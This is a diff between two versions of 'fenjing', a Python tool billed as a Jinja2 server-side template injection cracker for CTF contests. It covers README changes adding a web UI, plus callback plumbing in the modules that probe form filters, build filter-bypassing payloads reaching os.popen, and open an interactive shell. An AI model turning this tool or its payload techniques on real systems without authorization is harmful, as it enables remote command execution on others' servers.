# Comparing `tmp/fenjing-0.2.9.tar.gz` & `tmp/fenjing-0.3.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "fenjing-0.2.9.tar", last modified: Mon May 15 12:03:59 2023, max compression
+gzip compressed data, was "fenjing-0.3.0.tar", last modified: Wed May 17 10:25:43 2023, max compression
```

## Comparing `fenjing-0.2.9.tar` & `fenjing-0.3.0.tar`

### file list

```diff
@@ -1,32 +1,37 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-15 12:03:59.335925 fenjing-0.2.9/
--rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-05-15 12:03:40.000000 fenjing-0.2.9/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)       41 2023-05-15 12:03:40.000000 fenjing-0.2.9/MANIFEST.in
--rw-r--r--   0 runner    (1001) docker     (123)     6059 2023-05-15 12:03:59.335925 fenjing-0.2.9/PKG-INFO
--rwxr-xr-x   0 runner    (1001) docker     (123)     5621 2023-05-15 12:03:40.000000 fenjing-0.2.9/README.md
--rw-r--r--   0 runner    (1001) docker     (123)        6 2023-05-15 12:03:40.000000 fenjing-0.2.9/VERSION
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-15 12:03:59.335925 fenjing-0.2.9/fenjing/
--rwxr-xr-x   0 runner    (1001) docker     (123)      202 2023-05-15 12:03:40.000000 fenjing-0.2.9/fenjing/__init__.py
--rw-r--r--   0 runner    (1001) docker     (123)       60 2023-05-15 12:03:40.000000 fenjing-0.2.9/fenjing/__main__.py
--rw-r--r--   0 runner    (1001) docker     (123)     6540 2023-05-15 12:03:40.000000 fenjing-0.2.9/fenjing/cli.py
--rw-r--r--   0 runner    (1001) docker     (123)      800 2023-05-15 12:03:40.000000 fenjing-0.2.9/fenjing/colorize.py
--rw-r--r--   0 runner    (1001) docker     (123)      838 2023-05-15 12:03:40.000000 fenjing-0.2.9/fenjing/config_payload.py
--rw-r--r--   0 runner    (1001) docker     (123)     1213 2023-05-15 12:03:40.000000 fenjing-0.2.9/fenjing/const.py
--rwxr-xr-x   0 runner    (1001) docker     (123)       37 2023-05-15 12:03:40.000000 fenjing-0.2.9/fenjing/exceptions.py
--rw-r--r--   0 runner    (1001) docker     (123)     2670 2023-05-15 12:03:40.000000 fenjing-0.2.9/fenjing/form.py
--rw-r--r--   0 runner    (1001) docker     (123)    11621 2023-05-15 12:03:40.000000 fenjing-0.2.9/fenjing/form_cracker.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     3493 2023-05-15 12:03:40.000000 fenjing-0.2.9/fenjing/full_payload_gen.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     2846 2023-05-15 12:03:40.000000 fenjing-0.2.9/fenjing/int_vars.py
--rw-r--r--   0 runner    (1001) docker     (123)    28558 2023-05-15 12:03:40.000000 fenjing-0.2.9/fenjing/payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     1549 2023-05-15 12:03:40.000000 fenjing-0.2.9/fenjing/requester.py
--rw-r--r--   0 runner    (1001) docker     (123)     1213 2023-05-15 12:03:40.000000 fenjing-0.2.9/fenjing/scan_url.py
--rw-r--r--   0 runner    (1001) docker     (123)      941 2023-05-15 12:03:40.000000 fenjing-0.2.9/fenjing/shell_payload.py
--rw-r--r--   0 runner    (1001) docker     (123)     2880 2023-05-15 12:03:40.000000 fenjing-0.2.9/fenjing/waf_func_gen.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-15 12:03:59.335925 fenjing-0.2.9/fenjing.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)     6059 2023-05-15 12:03:59.000000 fenjing-0.2.9/fenjing.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      558 2023-05-15 12:03:59.000000 fenjing-0.2.9/fenjing.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-15 12:03:59.000000 fenjing-0.2.9/fenjing.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)       30 2023-05-15 12:03:59.000000 fenjing-0.2.9/fenjing.egg-info/requires.txt
--rw-r--r--   0 runner    (1001) docker     (123)        8 2023-05-15 12:03:59.000000 fenjing-0.2.9/fenjing.egg-info/top_level.txt
--rw-r--r--   0 runner    (1001) docker     (123)       30 2023-05-15 12:03:40.000000 fenjing-0.2.9/requirements.txt
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-05-15 12:03:59.335925 fenjing-0.2.9/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)      860 2023-05-15 12:03:40.000000 fenjing-0.2.9/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-17 10:25:43.834142 fenjing-0.3.0/
+-rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-05-17 10:25:32.000000 fenjing-0.3.0/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)      114 2023-05-17 10:25:32.000000 fenjing-0.3.0/MANIFEST.in
+-rw-r--r--   0 runner    (1001) docker     (123)     6165 2023-05-17 10:25:43.834142 fenjing-0.3.0/PKG-INFO
+-rwxr-xr-x   0 runner    (1001) docker     (123)     5727 2023-05-17 10:25:32.000000 fenjing-0.3.0/README.md
+-rw-r--r--   0 runner    (1001) docker     (123)        6 2023-05-17 10:25:32.000000 fenjing-0.3.0/VERSION
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-17 10:25:43.834142 fenjing-0.3.0/fenjing/
+-rwxr-xr-x   0 runner    (1001) docker     (123)      202 2023-05-17 10:25:32.000000 fenjing-0.3.0/fenjing/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)       60 2023-05-17 10:25:32.000000 fenjing-0.3.0/fenjing/__main__.py
+-rw-r--r--   0 runner    (1001) docker     (123)     6585 2023-05-17 10:25:32.000000 fenjing-0.3.0/fenjing/cli.py
+-rw-r--r--   0 runner    (1001) docker     (123)      800 2023-05-17 10:25:32.000000 fenjing-0.3.0/fenjing/colorize.py
+-rw-r--r--   0 runner    (1001) docker     (123)      838 2023-05-17 10:25:32.000000 fenjing-0.3.0/fenjing/config_payload.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1486 2023-05-17 10:25:32.000000 fenjing-0.3.0/fenjing/const.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)       37 2023-05-17 10:25:32.000000 fenjing-0.3.0/fenjing/exceptions.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2670 2023-05-17 10:25:32.000000 fenjing-0.3.0/fenjing/form.py
+-rw-r--r--   0 runner    (1001) docker     (123)    12072 2023-05-17 10:25:32.000000 fenjing-0.3.0/fenjing/form_cracker.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     4171 2023-05-17 10:25:32.000000 fenjing-0.3.0/fenjing/full_payload_gen.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     2846 2023-05-17 10:25:32.000000 fenjing-0.3.0/fenjing/int_vars.py
+-rw-r--r--   0 runner    (1001) docker     (123)    28967 2023-05-17 10:25:32.000000 fenjing-0.3.0/fenjing/payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1549 2023-05-17 10:25:32.000000 fenjing-0.3.0/fenjing/requester.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1213 2023-05-17 10:25:32.000000 fenjing-0.3.0/fenjing/scan_url.py
+-rw-r--r--   0 runner    (1001) docker     (123)      941 2023-05-17 10:25:32.000000 fenjing-0.3.0/fenjing/shell_payload.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-17 10:25:43.834142 fenjing-0.3.0/fenjing/static/
+-rw-r--r--   0 runner    (1001) docker     (123)      639 2023-05-17 10:25:32.000000 fenjing-0.3.0/fenjing/static/style.css
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-17 10:25:43.834142 fenjing-0.3.0/fenjing/templates/
+-rw-r--r--   0 runner    (1001) docker     (123)     6138 2023-05-17 10:25:32.000000 fenjing-0.3.0/fenjing/templates/index.html
+-rw-r--r--   0 runner    (1001) docker     (123)     3245 2023-05-17 10:25:32.000000 fenjing-0.3.0/fenjing/waf_func_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     8607 2023-05-17 10:25:32.000000 fenjing-0.3.0/fenjing/webui.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-17 10:25:43.834142 fenjing-0.3.0/fenjing.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     6165 2023-05-17 10:25:43.000000 fenjing-0.3.0/fenjing.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      629 2023-05-17 10:25:43.000000 fenjing-0.3.0/fenjing.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-17 10:25:43.000000 fenjing-0.3.0/fenjing.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       36 2023-05-17 10:25:43.000000 fenjing-0.3.0/fenjing.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        8 2023-05-17 10:25:43.000000 fenjing-0.3.0/fenjing.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       36 2023-05-17 10:25:32.000000 fenjing-0.3.0/requirements.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-05-17 10:25:43.838142 fenjing-0.3.0/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)      945 2023-05-17 10:25:32.000000 fenjing-0.3.0/setup.py
```

### Comparing `fenjing-0.2.9/LICENSE` & `fenjing-0.3.0/LICENSE`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.9/PKG-INFO` & `fenjing-0.3.0/PKG-INFO`

 * *Files 6% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.2.9
+Version: 0.3.0
 Summary: A Jinja2 SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.9
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
@@ -25,38 +25,38 @@
 
 在以下方法中选择一种
 
 ### 使用pip安装运行
 
 ```shell
 pip install fenjing
-python -m fenjing scan --url 'http://xxx/'
+python -m fenjing webui
 ```
 
 ### 下载并运行docker镜像
 
 ```shell
 docker pull marven11/fenjing
-docker run --net host -it marven11/fenjing scan --url 'http://xxx/'
+docker run --net host -it marven11/fenjing webui
 ```
 
 ### 手动安装
 
 ```shell
 git clone https://github.com/Marven11/Fenjing
 cd Fenjing
 python -m pip install -r requirements.txt
-python -m fenjing scan --url 'http://xxx/'
+python -m fenjing webui
 ```
 
 ### 手动构建Docker镜像
 
 ```shell
 docker build -t fenjing .
-docker run -it --net host fenjing scan --url 'http://xxx/'
+docker run -it --net host fenjing webui
 ```
 
 ## 特性
 
 支持绕过：
 
 - `'`和`"`
@@ -117,23 +117,27 @@
     - 其中的字符串也支持上面的任意字符串绕过
 
 
 ## 详细使用
 
 ### 作为命令行脚本使用
 
+- webui: 网页UI
+  - 顾名思义，网页UI
+  - 默认端口11451
 - scan: 扫描整个网站
   - 从网站中根据form元素提取出所有的表单并攻击
   - 扫描成功后会提供一个模拟终端或执行给定的命令
   - 示例：`python -m fenjing scan --url 'http://xxx/'`
 - crack: 对某个特定的表单进行攻击
   - 需要指定表单的url, action(GET或POST)以及所有字段(比如'name')
   - 攻击成功后也会提供一个模拟终端或执行给定的命令
   - 示例：`python -m fenjing crack --url 'http://xxx/' --method GET --inputs name`
-
+- get-config: 对某个特定的表单进行攻击，但是只获取flask config
+  - 参数大致上和crack相同
 ```
 Usage: python -m fenjing scan [OPTIONS]
 
 Options:
   -u, --url TEXT       需要扫描的URL
   -e, --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
   --interval FLOAT     每次请求的间隔
```

### Comparing `fenjing-0.2.9/README.md` & `fenjing-0.3.0/README.md`

 * *Files 6% similar despite different names*

```diff
@@ -12,38 +12,38 @@
 
 在以下方法中选择一种
 
 ### 使用pip安装运行
 
 ```shell
 pip install fenjing
-python -m fenjing scan --url 'http://xxx/'
+python -m fenjing webui
 ```
 
 ### 下载并运行docker镜像
 
 ```shell
 docker pull marven11/fenjing
-docker run --net host -it marven11/fenjing scan --url 'http://xxx/'
+docker run --net host -it marven11/fenjing webui
 ```
 
 ### 手动安装
 
 ```shell
 git clone https://github.com/Marven11/Fenjing
 cd Fenjing
 python -m pip install -r requirements.txt
-python -m fenjing scan --url 'http://xxx/'
+python -m fenjing webui
 ```
 
 ### 手动构建Docker镜像
 
 ```shell
 docker build -t fenjing .
-docker run -it --net host fenjing scan --url 'http://xxx/'
+docker run -it --net host fenjing webui
 ```
 
 ## 特性
 
 支持绕过：
 
 - `'`和`"`
@@ -104,23 +104,27 @@
     - 其中的字符串也支持上面的任意字符串绕过
 
 
 ## 详细使用
 
 ### 作为命令行脚本使用
 
+- webui: 网页UI
+  - 顾名思义，网页UI
+  - 默认端口11451
 - scan: 扫描整个网站
   - 从网站中根据form元素提取出所有的表单并攻击
   - 扫描成功后会提供一个模拟终端或执行给定的命令
   - 示例：`python -m fenjing scan --url 'http://xxx/'`
 - crack: 对某个特定的表单进行攻击
   - 需要指定表单的url, action(GET或POST)以及所有字段(比如'name')
   - 攻击成功后也会提供一个模拟终端或执行给定的命令
   - 示例：`python -m fenjing crack --url 'http://xxx/' --method GET --inputs name`
-
+- get-config: 对某个特定的表单进行攻击，但是只获取flask config
+  - 参数大致上和crack相同
 ```
 Usage: python -m fenjing scan [OPTIONS]
 
 Options:
   -u, --url TEXT       需要扫描的URL
   -e, --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
   --interval FLOAT     每次请求的间隔
```

### Comparing `fenjing-0.2.9/fenjing/cli.py` & `fenjing-0.3.0/fenjing/cli.py`

 * *Files 3% similar despite different names*

```diff
@@ -5,16 +5,17 @@
 from functools import partial
 
 from .form import Form
 from .form_cracker import FormCracker
 from .full_payload_gen import FullPayloadGen
 from .scan_url import yield_form
 from .requester import Requester
-from .const import DEFAULT_USER_AGENT, OS_POPEN_READ, CONFIG
+from .const import *
 from .colorize import colored
+from .webui import main as webui_main
 import click
 
 TITLE = colored("yellow", r"""
     ____             _ _            
    / __/__  ____    (_|_)___  ____ _
   / /_/ _ \/ __ \  / / / __ \/ __ `/
  / __/  __/ / / / / / / / / / /_/ / 
@@ -194,9 +195,13 @@
                 interact(cmd_exec_func)
             else:
                 print(cmd_exec_func(exec_cmd))
             return
     logger.warning("Scan failed...")
 
 
+@main.command()
+def webui():
+    webui_main()
+
 if __name__ == '__main__':
     main()
```

### Comparing `fenjing-0.2.9/fenjing/colorize.py` & `fenjing-0.3.0/fenjing/colorize.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.9/fenjing/config_payload.py` & `fenjing-0.3.0/fenjing/config_payload.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.9/fenjing/const.py` & `fenjing-0.3.0/fenjing/const.py`

 * *Files 20% similar despite different names*

```diff
@@ -46,7 +46,15 @@
     "eval",
     "config",
     "module_os",
     "os_popen_obj",
     "os_popen_read",
 ]
 
+CALLBACK_PREPARE_FULLPAYLOADGEN = "prepare_fullpayloadgen"
+CALLBACK_GENERATE_FULLPAYLOAD = "generate_full_payload"
+CALLBACK_GENERATE_PAYLOAD = "payload_gen"
+CALLBACK_SUBMIT = "submit"
+CALLBACK_TEST_FORM_INPUT = "test_form_input"
+
+APICODE_OK = 200
+APICODE_WRONG_INPUT = 401
```

### Comparing `fenjing-0.2.9/fenjing/form.py` & `fenjing-0.3.0/fenjing/form.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.9/fenjing/form_cracker.py` & `fenjing-0.3.0/fenjing/form_cracker.py`

 * *Files 4% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 from collections import namedtuple
 import logging
-from typing import List, Dict, Any, Union
+from typing import List, Dict, Any, Union, Callable
 
 from .form import random_fill, fill_form
 from .requester import Requester
 from .colorize import colored
-from .const import OS_POPEN_READ
+from .const import *
 from .waf_func_gen import WafFuncGen
 from .full_payload_gen import FullPayloadGen
 
 logger = logging.getLogger("form_cracker")
 Result = namedtuple("Result", "full_payload_gen input_field")
 
 
@@ -27,30 +27,30 @@
     test_result = "f3n j1ng"
 
     def __init__(
             self,
             url: str,
             form: Dict[str, Any],
             requester: Requester,
+            callback: Union[Callable[[str, Dict], None], None] = None
     ):
         """生成用于攻击form的类
 
         Args:
+            url (str, optional): form所在的url.
             form (dict): 解析后的form元素
-            method (str, optional): form的提交方法. Defaults to "POST".
-            inputs (list, optional): form的输入. Defaults to None.
-            url (str, optional): form所在的url. Defaults to None.
-            action (str, optional): form的action, 为None时和url相同. Defaults to None.
-            requester (Requester, optional): 用于发出请求的requester，为None时自动构造. Defaults to None.
-            request_interval (float, optional): 请求的间隔，用于构造requester. Defaults to 0.
+            requester (Requester, optional): 用于发出请求的requester，为None时自动构造.
+            callback (Union[Callable[[str, Dict], None], None]): callback函数，在完成某些阶段后会调用此函数
         """
         self.url = url
         self.form = form
         self.req = requester
-        self.waf_func_gen = WafFuncGen(self.url, self.form, self.req)
+        self.callback: Callable[[str, Dict], None] = callback if callback else (
+            lambda x, y: None)
+        self.waf_func_gen = WafFuncGen(self.url, self.form, self.req, self.callback)
 
     def vulunable_inputs(self) -> List[str]:
         """解析出form中有回显的input
 
         Returns:
             List[str]: 所有有回显的input name
         """
@@ -75,57 +75,78 @@
         Returns:
             requests.Response: 返回的reponse元素
         """
         all_length = sum(len(v) for v in inputs.values())
         if all_length > 2048 and self.form["method"] == "GET":
             logger.warning(
                 f"inputs are extremely long (len={all_length}) that the request might fail")
-        return self.req.request(
+
+        r = self.req.request(
             **fill_form(self.url, self.form, inputs))
 
+        self.callback(CALLBACK_SUBMIT, {
+            "form": self.form,
+            "inputs": inputs,
+            "response": r,
+        })
+
+        return r
+
+    def test_input(self, input_field, payload):
+        logger.info(
+            f"Input {colored('yellow', repr(input_field))} looks great, testing generated payload.")
+        r = self.submit({input_field: payload})
+        assert r is not None
+        return self.test_result in r.text
+
     def crack_inputs(self, input_field: str) -> Union[Result, None]:
         """攻击对应的input
 
         Args:
             input_field (str): 需要攻击的input
 
         Returns:
             Union[Result, None]: 对应的payload生成函数，以及对应的input
         """
         logger.info(f"Testing {colored('yellow', input_field)}")
 
         waf_func = self.waf_func_gen.generate(input_field)
-        full_payload_gen = FullPayloadGen(waf_func)
-        payload, will_echo = full_payload_gen.generate(OS_POPEN_READ, self.test_cmd)
-        # payload, will_echo = exec_cmd_payload(waf_func, self.test_cmd)
+        full_payload_gen = FullPayloadGen(waf_func, callback=self.callback)
+        payload, will_print = full_payload_gen.generate(
+            OS_POPEN_READ, self.test_cmd)
         if payload is None:
+            self.callback(CALLBACK_TEST_FORM_INPUT, {
+                "ok": False,
+            })
             return None
-        if will_echo:
-            logger.info(
-                f"Input {colored('yellow', repr(input_field))} looks great, testing generated payload.")
-            r = self.submit({input_field: payload})
-            assert r is not None
-            if self.test_result in r.text:
+
+        is_test_success = None  # payload测试成功时为True, 失败时为False, 无法测试为None
+        if will_print:
+            if self.test_input(input_field, payload):
                 logger.info(
                     f"{colored('green', 'Success!')} Now we can generate payloads.")
+                is_test_success = True
             else:
                 logger.info(
                     f"{colored('yellow', 'Test Payload Failed', bold=True)}! Generated payloads might be useless.")
-            return Result(
-                full_payload_gen=full_payload_gen,
-                input_field=input_field
-            )
         else:
             logger.info(
                 f"Input {input_field} looks great, but we WON'T SEE the execution result! " +
                 "You can try generating payloads anyway.")
-            return Result(
-                full_payload_gen=full_payload_gen,
-                input_field=input_field
-            )
+
+        self.callback(CALLBACK_TEST_FORM_INPUT, {
+            "ok": True,
+            "will_print": will_print,
+            "test_success": is_test_success,
+            "input_field": input_field
+        })
+        return Result(
+            full_payload_gen=full_payload_gen,
+            input_field=input_field
+        )
 
     def crack(self) -> Union[Result, None]:
         """攻击表单
 
         Returns:
             Union[Result, None]: 对应的payload生成函数，以及对应的input
         """
```

### Comparing `fenjing-0.2.9/fenjing/full_payload_gen.py` & `fenjing-0.3.0/fenjing/full_payload_gen.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,13 +1,14 @@
-from typing import Callable, List, Tuple, Union
+from typing import Callable, List, Tuple, Union, Dict
 import logging
 
 from . import payload_gen
 from .int_vars import get_useable_int_vars
 from .colorize import colored
+from .const import *
 
 logger = logging.getLogger("shell_payload")
 
 
 def get_int_context(waf_func):
     ints, var_names, payload = get_useable_int_vars(waf_func)
     if len(ints) == 0:
@@ -40,17 +41,18 @@
             return outer_pattern, will_print
     else:
         logger.warning("LOTS OF THINGS is being waf, NOTHING FOR YOU!")
         return None, None
 
 
 class FullPayloadGen:
-    def __init__(self, waf_func):
+    def __init__(self, waf_func, callback: Union[Callable[[str, Dict], None], None] = None):
         self.waf_func = waf_func
         self.prepared = False
+        self.callback: Callable[[str, Dict], None] = callback if callback else (lambda x, y: None)
 
     def do_prepare(self) -> bool:
 
         if self.prepared:
             return True
 
         int_payload, int_context = get_int_context(self.waf_func)
@@ -63,17 +65,22 @@
             return False
         if self.will_print:
             logger.info(f"use {colored('blue', self.outer_pattern)}")
         else:
             logger.warning(
                 f"use {colored('blue', self.outer_pattern)}, which {colored('red', 'will not print')} your result!")
 
-        self.payload_gen = payload_gen.PayloadGenerator(self.waf_func, self.context)
-
+        self.payload_gen = payload_gen.PayloadGenerator(self.waf_func, self.context, self.callback)
         self.prepared = True
+        self.callback(CALLBACK_PREPARE_FULLPAYLOADGEN, {
+            "context_payload": self.context_payload,
+            "context": self.context,
+            "outer_pattern": self.outer_pattern,
+            "will_print": self.will_print,
+        })
         return True
 
     def generate(self, gen_type, *args) -> Tuple[Union[str, None], Union[bool, None]]:
 
         if not self.prepared and not self.do_prepare():
             return None, None
 
@@ -88,13 +95,22 @@
 
         if inner_payload is None:
             logger.warning("Bypassing WAF Failed.")
             return None, None
 
         assert isinstance(self.outer_pattern, str)
 
+        payload = self.context_payload + self.outer_pattern.replace("PAYLOAD", inner_payload)
+
+        self.callback(CALLBACK_GENERATE_FULLPAYLOAD, {
+            "gen_type": gen_type,
+            "args": args,
+            "payload": payload,
+            "will_print": self.will_print,
+        })
+
         return (
-            self.context_payload + self.outer_pattern.replace("PAYLOAD", inner_payload), 
+            payload, 
             self.will_print
         )
```

### Comparing `fenjing-0.2.9/fenjing/int_vars.py` & `fenjing-0.3.0/fenjing/int_vars.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.9/fenjing/payload_gen.py` & `fenjing-0.3.0/fenjing/payload_gen.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,9 +1,9 @@
 from collections import defaultdict
-from typing import Callable, DefaultDict, List, Dict, Union
+from typing import Callable, DefaultDict, List, Dict, Union, Any
 import re
 import time
 import logging
 from .colorize import colored
 from .const import *
 
 req_gens: DefaultDict[str, List[Callable]] = defaultdict(list)
@@ -16,22 +16,28 @@
     if not gen_type:
         raise Exception(
             f"Error found when register payload generator {f.__name__}")
     req_gens[gen_type.group(1)].append(f)
 
 
 class PayloadGenerator:
-    def __init__(self, waf_func: Callable, context: Union[Dict, None]):
+    def __init__(
+        self,
+        waf_func: Callable,
+        context: Union[Dict, None],
+        callback: Union[Callable[[str, Dict], None], None] = None
+    ):
         self.waf_func = waf_func
         self.context = context
         self.cache = {}
         self.generate_funcs = {
             LITERAL: self.literal_generate,
             UNSATISFIED: self.unsatisfied_generate
         }
+        self.callback: Callable[[str, Dict], None] = callback if callback else (lambda x, y: None)
 
     def cache_add(self, gen_type, *args, result=None):
         try:
             # hash() might fail
             if (gen_type, *args) in self.cache:
                 return
             self.cache[(gen_type, *args)] = result
@@ -78,27 +84,37 @@
 
         if self.cache_has(gen_type, *args):
             return self.cached_generate(gen_type, *args)
 
         if gen_type not in req_gens:
             raise Exception(f"Required type '{gen_type}' not supported.")
 
+        # 遍历当前类型每一个payload生成函数
         for req_gen_func in req_gens[gen_type].copy():
             son_req = req_gen_func(self.context, *args)
 
             assert isinstance(
                 son_req, list), f"Wrong son_req {son_req} from {req_gen_func.__name__}"
             assert all(isinstance(gen_type, str) for gen_type, *
                        args in son_req), f"Wrong son_req {son_req} from {req_gen_func.__name__}"
 
             payload = self.generate_by_req_list(son_req)
             if not payload:
                 continue
+
+            # 生成成功后执行的操作
             self.count_success(gen_type, req_gen_func.__name__)
             self.cache_add(gen_type, *args, result=payload)
+            self.callback(CALLBACK_GENERATE_PAYLOAD, {
+                "gen_type": gen_type,
+                "args": args,
+                "payload": payload
+            })
+
+            # 为了日志的简洁，仅打印一部分日志
             if gen_type in (INTEGER, STRING) and payload != str(args[0]):
                 logger.info("{great}, {gen_type}({args_repl}) can be {payload}".format(
                     great=colored("green", "Great"),
                     gen_type=colored("yellow", gen_type, bold=True),
                     args_repl=colored("yellow", ", ".join(repr(arg)
                                       for arg in args)),
                     payload=colored("blue", payload)
@@ -107,15 +123,14 @@
             elif gen_type in (EVAL_FUNC, EVAL, CONFIG, MODULE_OS, OS_POPEN_OBJ, OS_POPEN_READ):
                 logger.info("{great}, we generate {gen_type}({args_repl})".format(
                     great=colored("green", "Great"),
                     gen_type=colored("yellow", gen_type, bold=True),
                     args_repl=colored("yellow", ", ".join(repr(arg)
                                       for arg in args)),
                 ))
-            # logger.warning(f"{log.colored('green', gen_type.upper())} {args_repl} should be {log.colored('blue', payload)}")
             return payload
         logger.warning("{failed} generating {gen_type}({args_repl})".format(
             failed=colored("red", "failed"),
             gen_type=gen_type,
             args_repl=", ".join(repr(arg) for arg in args),
         ))
         self.cache_add(gen_type, *args, result=None)
@@ -770,14 +785,15 @@
 def gen_string_concat3(context: dict, value: str):
     return [
         (LITERAL, "({})".format(
             "".join('"{}"'.format(c if c != '"' else '\\"') for c in value)
         ))
     ]
 
+
 @req_gen
 def gen_string_dictjoin(context: dict, value: str):
     if not re.match("^[a-zA-Z_]+$", value):
         return [
             (UNSATISFIED, )
         ]
     return [
@@ -880,46 +896,48 @@
             req.append((LITERAL, ","))
         req.append((INTEGER, ord(c)))
     req.append(
         (LITERAL, "))")
     )
     return req
 
+
 @req_gen
 def gen_string_formatfunc2(context: dict, value: str):
     # (FORMAT(97,98,99))
     # FORMAT = (CS.format)
     # CS = (C*L)
     if "{:c}" not in context.values():
         return [
             (UNSATISFIED, )
         ]
     k = [k for k, v in context.values() if v == "{:c}"][0]
     cs = "({c}*{l})".format(
-        c = k,
-        l = len(value)
+        c=k,
+        l=len(value)
     )
     format_func = (ATTRIBUTE, (LITERAL, cs), "format")
     req = [
         (LITERAL, "("),
         format_func,
         (LITERAL, "("),
         (LITERAL, ",".join(str(ord(c)) for c in value)),
         (LITERAL, "))")
     ]
     return req
 
+
 @req_gen
 def gen_string_formatfunc3(context: dict, value: str):
     # (FORMAT(97,98,99))
     # FORMAT = (CS.format)
     # CS = (C*L)
     cs = "(({c})*{l})".format(
-        c = "{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)|replace(1|string,{}|join)|replace(2|string,dict(c=1)|join)",
-        l = len(value)
+        c="{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)|replace(1|string,{}|join)|replace(2|string,dict(c=1)|join)",
+        l=len(value)
     )
     format_func = (ATTRIBUTE, (LITERAL, cs), "format")
     req = [
         (LITERAL, "("),
         format_func,
         (LITERAL, "("),
         (LITERAL, ",".join(str(ord(c)) for c in value)),
```

### Comparing `fenjing-0.2.9/fenjing/requester.py` & `fenjing-0.3.0/fenjing/requester.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.9/fenjing/scan_url.py` & `fenjing-0.3.0/fenjing/scan_url.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.9/fenjing/shell_payload.py` & `fenjing-0.3.0/fenjing/shell_payload.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.9/fenjing/waf_func_gen.py` & `fenjing-0.3.0/fenjing/waf_func_gen.py`

 * *Files 12% similar despite different names*

```diff
@@ -1,13 +1,14 @@
 from urllib.parse import urlparse
 from collections import Counter, namedtuple
 from functools import lru_cache
 import logging
-from typing import List, Dict, Tuple, Callable, Any
+from typing import List, Dict, Tuple, Callable, Any, Union
 
+from .const import *
 from .form import Form, random_fill, fill_form
 from .requester import Requester
 from .colorize import colored
 
 
 logger = logging.getLogger("waf_func_gen")
 Result = namedtuple("Result", "payload_generate_func input_field")
@@ -25,43 +26,53 @@
     ]
 
     def __init__(
             self,
             url: str,
             form: Dict[str, Any],
             requester: Requester,
+            callback: Union[Callable[[str, Dict], None], None] = None
     ):
         """根据指定的表单生成对应的WAF函数
 
         Args:
             url (str, optional): form所在的url. Defaults to None.
             form (dict): 解析后的form元素
             requester (Requester, optional): 用于发出请求的requester，为None时自动构造. Defaults to None.
         """
         self.url = url
         self.form = form
         self.req = requester
-
+        self.callback: Callable[[str, Dict], None] = callback if callback else (
+            lambda x, y: None)
 
     def submit(self, inputs: dict):
         """根据inputs提交form
 
         Args:
             inputs (dict): 需要提交的input
 
         Returns:
             requests.Response: 返回的reponse元素
         """
         all_length = sum(len(v) for v in inputs.values())
         if all_length > 2048 and self.form["method"] == "GET":
             logger.warning(
                 f"inputs are extremely long (len={all_length}) that the request might fail")
-        return self.req.request(
+        r = self.req.request(
             **fill_form(self.url, self.form, inputs))
 
+        self.callback(CALLBACK_SUBMIT, {
+            "form": self.form,
+            "inputs": inputs,
+            "response": r,
+        })
+
+        return r
+
     def waf_page_hash(self, input_field: str):
         """使用危险的payload测试对应的input，得到一系列响应后，求出响应中最常见的几个hash
 
         Args:
